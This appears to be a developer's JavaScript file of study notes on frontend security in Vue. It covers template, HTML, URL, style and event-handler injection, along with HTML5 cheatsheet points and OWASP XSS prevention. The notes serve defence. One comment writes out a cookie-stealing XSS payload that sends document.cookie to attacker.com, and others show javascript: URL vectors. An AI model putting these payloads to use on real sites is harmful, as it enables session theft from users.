// HTTP security vulnerabilities, such as cross-site request forgery (CSRF/XSRF) and cross-site script inclusion (XSSI), are primarily addressed on the backend, so they aren't a concern of Vue's.
// The general rule is that if you allow unsanitized, user-provided content to be executed (as either HTML, JavaScript, or even CSS), you might open yourself up to attacks.

// Never Use Non-trusted Templates 
Vue.createApp({
    template: `<div>` + userProvidedString + `</div>` // NEVER DO THIS
}).mount('#app')

// Vue automatically escaped HTML content, attrubute bindings to make secured content.

// HTML Injection:
// < div v-html="userProvidedHtml" ></div > : User Prived HTML
// User-provided HTML can never be considered 100% safe unless it's in a sandboxed iframe or in a part of the app where only the user who wrote that HTML can ever be exposed to it.

// URL Injection :
{/* <a :href="userProvidedUrl">
  click me
</a> */}
// There's a potential security issue if the URL has not been "sanitized" to prevent JavaScript execution using javascript:
// There are libraries such as sanitize-url to help with this
// But f you're ever doing URL sanitization on the frontend, you already have a security issue.
// User-provided URLs as Input should always be sanitized by your backend before even being saved to a database.

// Style Injection:
// <a:href="sanitizedUrl"
//   : style = "userProvidedStyles"
//     >
//     click me
// </a >
// ith the userProvidedStyles, malicious users could still provide CSS to "click jack", e.g. styling the link into a transparent box over the "Log in" button.
// we recommend only allowing full control over CSS inside a sandboxed iframe, rather than taking full styling from user, just take like color, background color
// <a:href="sanitizedUrl"
//   : style = "{
// color: userProvidedColor,
//     background: userProvidedBackground
//   }"
//     >
//     click me
// </a >

// JavaScript Injection :
// Every HTML element has attributes with values accepting strings of JavaScript, such as onclick, onfocus, and onmouseenter
// Binding user-provided JavaScript to any of these event attributes is a potential security risk, so it should be avoided.


// HTML5 Security Cheatsheet:
// Don't allow users to submit markup containing "form" and "formaction" attributes or transform them to bogus attributes. Avoid "id" attributes for forms as well as submit buttons.
// If your website allows users to submit HTML content (comments, descriptions, bios, blog posts), an attacker can inject hidden forms or fake submit buttons that make other users unknowingly perform actions.
// avoid id attributes on forms or submit buttons, attacker will access it document.getElementById("submit").click();
// User submitted markup should not contain "autofocus" attributes.
// Make sure only relative URIs, http URIs and correctly MIME-typed data URIs can be used for VIDEO poster attributes
// Make sure users cannot submit markup including the form, "onformchange" and "onforminput" attributes. Do not apply <FORM> elements with an "id" attribute.
// Make sure user submitted <SOURCE> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.
// Make sure user submitted <AUDIO> and <VIDEO> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.
// <input oninput="alert('typing')">, atatcker can give- <input oninput="fetch('http://attacker.com/?c=' + document.cookie)">. Use HTMLPurifier or similar sanitizers or do not use oninput
// Do not allow users to submit unfiltered MathML content.
// Avoid white-listing the "dirname" attribute in user generated content. The effects on existing forms are hard to predict and might cause privacy problems and information leaks.
// Make sure that HTML imports are limited to the same origin. Avoid permitting users to have <link> tags in user-generated rich-text as they can now directly execute JavaScript without any user interaction.
// Make sure to use "srcdoc" only in combination with the Iframe Sandbox. Otherwise, XSS attacks might slip through existing filters' rules as the payload can be HTML encoded.
// srcset in img tag triggers image loading events even when the URL is invalid., attaccker can use srcset + onerror.
// Do not allow users to use srcset, <picture>, or <source> in user-submitted HTML, because attackers can use them to secretly run JavaScript. If you use in code, it wont be a problem. But user povided html will have problem.
// Do not rely on the noreferrer attribute value alone, but rather use a dedicated de-referrer page that in additon deactivates window.opener using window.opener.__proto__=null.
// Be very careful when HTML attributes are used to carry HTML data that is later being used on the website.
// Be sure to work with whitelists when allowing users to submit markup - else experimental tags like <DETAILS> might be forgotten to filter and escape.
// Be sure to work with whitelists when allowing users to submit markup - else ancient tags like <FRAMESET> might be forgotten to filter and escape.
// In case evil attributes like event handlers are being filtered from user submitted markup make sure not to forget "background" - among others., <table background="javascript:alert(1)"></table>, make background blacklist
// target="_blank" (without rel="noopener" or rel="noreferrer"): it will be problematic.
// obsolete HTML5 and should be replaced entirely by CSS like align, bgColor, width, height, border on table. target, frameborder, scrolling etc.
// Make sure comments are not allowed in user submitted html. The markup should be checked for security issues after comments have been stripped out - not before.
// Make sure <COMMENT> tags are not allowed in user submitted html.
// Make sure CDATA delimiters are not allowed in user submitted html
// User submitted HTML should not allow usage of <BASE> tags.
// Make sure user submitted HTML cannot contain <OBJECT> tags or only whitelisted <OBJECT> "data" values.
// Make sure user submitted HTML cannot contain <EMBED> tags or only whitelisted <EMBED> "src" values.
// etc. etc. etc. Read full document here: https://html5sec.org/


//  Cross Site Scripting Prevention:
// XSS (Cross-Site Scripting) is a web security vulnerability that allows an attacker to inject malicious JavaScript into a website.
// XSS is when a hacker manages to run JavaScript inside your website pages, without your permission.
// Use Modern Framework
// All variables in a web application needs to be protected. Ensuring that all variables go through validation and are then escaped or sanitized is known as perfect injection resistance.
// Frameworks make it easy to ensure variables are correctly validated and escaped or sanitised.
// In order to add a variable to a HTML context safely to a web template, use HTML entity encoding for that variable. Vue automatically do that.
// Output Encoding for “HTML Attribute Contexts”. Vue also automatically do that.
// Output Encoding for “JavaScript Contexts”. “JavaScript Contexts” refers to the situation where variables are placed into inline JavaScript and then embedded in an HTML document.
// The only ‘safe’ location for placing variables in JavaScript is inside a “quoted data value”. All other contexts are unsafe and you should not place variable data in them.
// For JSON, verify that the Content-Type header is application/json and not text/html to prevent XSS.
// Output Encoding for “CSS Contexts”
// Output Encoding for “URL Contexts”
// <a href="http://www.owasp.org?test=$varUnsafe">link</a >, Encode all characters with the %HH encoding format. Make sure any attributes are fully quoted, same as JS and CSS.
// url = "https://site.com?data=" + urlencode(parameter), <a href='attributeEncode(url)'>link</a>
// If you're using JavaScript to construct a URL Query Value, look into using window.encodeURIComponent(x)

// Dangerous contexts include:
{/* <script>Directly in a script</script>
<!--Inside an HTML comment-- >
<style>Directly in CSS</style>
<div ToDefineAnAttribute=test />
<ToDefineATag href="/test" /> */}
// Callback functions
// Where URLs are handled in code such as this CSS { background-url : “javascript:alert(xss)”; }
// All JavaScript event handlers (onclick(), onerror(), onmouseover()).
// Unsafe JS functions like eval(), setInterval(), setTimeout()
// Don't place variables into dangerous contexts as even with output encoding, it will not prevent an XSS attack fully.

// HTML Sanitization will strip dangerous HTML from a variable and return a safe string of HTML. OWASP recommends DOMPurify for HTML Sanitization.
// let clean = DOMPurify.sanitize(dirty);
// Try to refactor your code to remove references to unsafe sinks like innerHTML, and instead use textContent or value.

// Framework Security Protections, Output Encoding, and HTML Sanitization will provide the best protection for your application. 